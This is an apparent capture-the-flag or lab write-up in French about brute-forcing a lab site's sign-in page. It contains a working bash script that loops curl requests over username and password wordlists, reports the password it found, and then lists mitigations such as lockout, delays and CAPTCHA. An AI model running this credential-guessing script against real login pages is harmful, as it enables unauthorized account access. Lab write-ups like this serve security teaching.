# Explication
Sur la page ***Sign In*** on peut lancer un script brut force pour trouver les identifiants et mots de passe en envoyant les données dans l'URL:
```bash
IP="http://10.11.200.106/"
usernameFile="top-usernames-shortlist.txt"
curl "$IP?page=signin&username=&password=&Login=Login" > page.html
error=$(sed '37!d' page.html)
i=0
while read -r tryUserName
do
    passwdFile="10-million-password-list-top-1000.txt"
    while read -r tryPasswd
    do
        i=$((i+1))
        echo "TRY n$i : username=$tryUserName password=$tryPasswd"
        curl "$IP?page=signin&username=$tryUserName&password=$tryPasswd&Login=Login" > page.html
        check=$(sed '37!d' page.html)
        if [[ $check != $error ]]
        then
            echo "SUCCES! username: $tryUserName | password : $tryPasswd"
            exit
        fi
    done < $passwdFile
done < $usernameFile
```
Par ailleurs on constate que le nom de l'utilisateur n'a aucun intéret car non pris en compte pour l'accès.
Le mot de passe est : shadow
# Comment l'éviter ?
On peut éviter cette faille de multiples façons:
- Limiter le nombre de tentatives de connexion avant de bloquer le compte (peut être problématique + DDOS possible)
- Mettre un délai entre chaque tentative de connexion
- Utiliser des CAPTCHA

source : https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks